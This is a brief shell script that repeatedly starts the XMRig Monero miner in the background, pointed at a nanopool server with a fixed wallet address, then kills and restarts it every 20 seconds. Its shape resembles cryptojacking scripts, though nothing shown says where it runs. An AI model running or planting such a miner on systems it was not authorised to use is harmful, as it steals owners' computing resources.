set -x

while true; do
    /xmrig-6.16.4/xmrig --donate-level 100 -o xmr-us-east1.nanopool.org:14433 -k -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background && sleep 20 && pkill xmrig && echo restarting_miner
done